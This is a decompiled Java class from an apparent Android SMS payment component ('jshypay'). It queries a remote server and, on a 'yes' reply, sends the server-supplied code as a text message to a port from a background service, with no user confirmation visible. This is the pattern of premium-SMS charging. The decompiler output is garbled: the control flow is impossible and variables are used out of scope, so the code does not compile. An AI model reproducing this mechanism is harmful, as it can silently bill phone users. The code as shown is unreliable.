package com.jshymedia.jshypay.service;

import android.app.PendingIntent;
import android.content.Context;
import android.telephony.SmsManager;
import com.jshymedia.jshypay.net.Purl;
import com.jshymedia.jshypay.order.AutoAns;
import com.jshymedia.jshypay.ztool.ZNetTask;
import com.jshymedia.jshypay.ztool.Zlog;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import org.json.JSONException;
import org.json.JSONObject;

final class e
  implements Runnable
{
  e(SysService paramSysService, AutoAns paramAutoAns, Context paramContext, SmsManager paramSmsManager, PendingIntent paramPendingIntent1, PendingIntent paramPendingIntent2) {}
  
  public final void run()
  {
    String str = this.a.getSendMessage();
    StringBuilder localStringBuilder;
    try
    {
      str = URLEncoder.encode(str, "utf-8");
      str = Purl.makeUrl(Purl.sms_count_url, this.b) + "&code=" + str + "&spid=" + this.a.getSpid() + "&msg=" + this.a.getSendMsg() + "&cparam=" + this.a.getCparam();
      Zlog.syso("reSmsType2.url:" + str);
      str = ZNetTask.getStr(str);
      Zlog.syso("reSmsCountBack:" + str);
      if (str == null) {
        return;
      }
    }
    catch (UnsupportedEncodingException localUnsupportedEncodingException)
    {
      for (;;)
      {
        localUnsupportedEncodingException.printStackTrace();
        Object localObject = "error";
        continue;
        try
        {
          localObject = new JSONObject((String)localObject);
          if ("yes".equals(((JSONObject)localObject).getString("state")))
          {
            localObject = ((JSONObject)localObject).getString("code");
            if ((localObject != null) && (this.a.getPort() != null))
            {
              Zlog.syso("sendMethodOK:port:" + this.a.getPort() + ",sendtext:" + (String)localObject);
              Zlog.syso("Send..." + this.a.getPort() + ",msg:" + (String)localObject);
              this.c.sendTextMessage(this.a.getPort(), null, (String)localObject, this.d, this.e);
              return;
            }
          }
        }
        catch (JSONException localJSONException)
        {
          localJSONException.printStackTrace();
          return;
        }
      }
      localStringBuilder = new StringBuilder("sendPortOrSendTextNUllport:");
      if (this.a.getPort() == null) {}
    }
    for (boolean bool = true;; bool = false)
    {
      Zlog.syso(bool + "message:" + localJSONException);
      return;
    }
  }
}
